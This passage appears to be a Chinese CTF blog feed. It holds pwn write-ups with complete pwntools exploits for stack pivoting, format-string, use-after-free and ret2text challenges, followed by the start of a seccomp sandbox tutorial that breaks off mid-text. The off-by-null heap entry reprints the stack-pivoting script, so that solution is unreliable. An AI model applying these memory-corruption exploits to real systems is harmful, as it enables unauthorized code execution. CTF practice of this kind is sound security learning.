class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>栈迁移蛮有意思的，结构b’a’*padding + p64(goal) + p64(leave_ret)，通过执行两次 leave ; ret 将栈迁移到目标位置</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="夕阳下的舞者"><a href="#夕阳下的舞者" class="headerlink" title="夕阳下的舞者"></a>夕阳下的舞者</h2><h3 id="程序保护-11"><a href="#程序保护-11" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目主要类型为offbynull制造堆块重叠，函数结构比较复杂，需要ida逆向理清，这里提供简单思路</p><ul><li>Step1：泄露libc基址。申请chunk，正常释放，大于fastbin的chunk会被放入unsortedbin中，且fd和bk均指向于main_arena_88的位置，可以获得libc基址</li><li>Step2：泄露堆地址。为啥泄露堆地址，因为开启了PIE，创建2个不相邻的 small chunk，释放后会放到 unsoted bin 中，通过打印函数可以泄露地址。</li><li>Step3：off-by-null，getshell 利用off-by-null漏洞制造堆块重叠，用fastbin去申请mallochook-0x23位置的一个chunk去修改mallochook为og</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="test-format"><a href="#test-format" class="headerlink" title="test_format"></a>test_format</h2><h3 id="程序保护-12"><a href="#程序保护-12" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>格式化字符串漏洞，修改任意位置的值</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2121</span>)<br><span class="hljs-comment">#p = process('./test_format')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./test_format'</span>)<br><br>goal = <span class="hljs-number">0x0804A030</span><br>payload = <span class="hljs-string">'aaaa%8$n'</span> + p64(goal)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="heap-Easy-Uaf"><a href="#heap-Easy-Uaf" class="headerlink" title="heap_Easy_Uaf"></a>heap_Easy_Uaf</h2><h3 id="程序保护-13"><a href="#程序保护-13" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p>漏洞存在于Are()函数中，函数malloc了一个0x71大小的堆块，但是并没有清0，存在释放后使用的可能性。在之后申请了一个chunk b，chunk b的内容存在堆溢出。我这里的思路就是如果在a的上方有个大小小于0x71，释放的chunk，程序会将b申请到a的上方，这样通过堆溢出可以修改a的内容为”Flag”，官方做法是直接 将申请的b在a中，填写b的内容为Flag也可以！</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2094</span>)<br><span class="hljs-comment">#p = process('./heap_Easy_Uaf')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./heap_Easy_Uaf'</span>)<br><span class="hljs-comment">#heaparray = 0x602100</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">amaze</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"5"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Chunk size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Please Input Content : \n'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"6"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><br>heap_ptr = <span class="hljs-number">0x602100</span><br>shell=<span class="hljs-number">0x400A16</span><br><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#debug()</span><br>amaze(<span class="hljs-number">8</span>,<span class="hljs-string">''</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>pay = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">"Flag"</span><br>amaze(<span class="hljs-number">8</span>,pay)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="小狗汪汪汪"><a href="#小狗汪汪汪" class="headerlink" title="小狗汪汪汪"></a>小狗汪汪汪</h2><h3 id="程序保护-14"><a href="#程序保护-14" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2text</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2133</span>)<br><span class="hljs-comment">#p = process('./woof')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br><br>backdoor = <span class="hljs-number">0x0804859B</span><br>p.recvuntil(<span class="hljs-string">b'This puppy needs to eat a few bones?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x9</span>+<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0x0804859B</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待</summary>
      
    
    
    
    <category term="wp" scheme="https://kylinxin.github.io/categories/wp/"/>
    
    
    <category term="wp" scheme="https://kylinxin.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>prctl-seccomp-orw</title>
    <link href="https://kylinxin.github.io/2023/09/18/prctl-seccomp/"/>
    <id>https://kylinxin.github.io/2023/09/18/prctl-seccomp/</id>
    <published>2023-09-18T15:14:29.000Z</published>
    <updated>2023-11-26T06:23:19.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）"><a href="#初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）" class="headerlink" title="初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）"></a><strong>初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</strong></h1><blockquote><p>题目来源：<a href="https://pwnable.tw/challenge/#2%EF%BC%88orw%EF%BC%89">https://pwnable.tw/challenge/#2（orw）</a><br>参考资料：<br><a href="https://www.anquanke.com/post/id/186447">https://www.anquanke.com/post/id/186447</a><br><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A">https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A</a>  密码: hvqc<br>–来自百度网盘超级会员V3的分享</p></blockquote><h2 id="prctl-seccomp-简介"><a href="#prctl-seccomp-简介" class="headerlink" title="prctl-seccomp 简介"></a>prctl-seccomp 简介</h2><p>seccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。</p><blockquote><p>sandbox：沙箱、沙盒</p></blockquote><h2 id="使用seccomp-tools查看可用系统调用（识别沙箱规则）"><a href="#使用seccomp-tools查看可用系统调用（识别沙箱规则）" class="headerlink" title="使用seccomp-tools查看可用系统调用（识别沙箱规则）"></a>使用seccomp-tools查看可用系统调用（识别沙箱规则）</h2><blockquote><p>安装方式：<a href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p><p>$ gem install seccomp-tools</p><p>sudo apt install gcc ruby-dev</p></blockquote><p>执行如下图中命令即可查看此ELF文件中可用的系统调用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><p>##从IDA开始分析题目</p><p>将题目下载下来，我们先来看一下程序的代码，直接来到main函数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>进入orw_seccomp();</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">orw_seccomp</span><span class="hljs-params">()</span><br>{<br>  __int16 v1; <span class="hljs-comment">// [esp+4h] [ebp-84h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+8h] [ebp-80h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  qmemcpy(v3, &amp;unk_8048640, <span class="hljs-keyword">sizeof</span>(v3));<br>  v1 = <span class="hljs-number">12</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>我们注意一下代码中的两个prctl：</p><blockquote><p>prctl(38, 1, 0, 0, 0)</p><p>prctl(22, 2, &amp;v1);</p></blockquote><p>先记住这两个函数，接下来会提到，这里暂时先放一放。</p><h2 id="prctl函数原型"><a href="#prctl函数原型" class="headerlink" title="prctl函数原型"></a>prctl函数原型</h2><p>看一下这个函数的原型：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure><p>函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS<br>PR_SET_SECCOMP<br></code></pre></td></tr></tbody></table></figure><p>先来看第一个，PR_SET_NO_NEW_PRIVS：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Set the calling 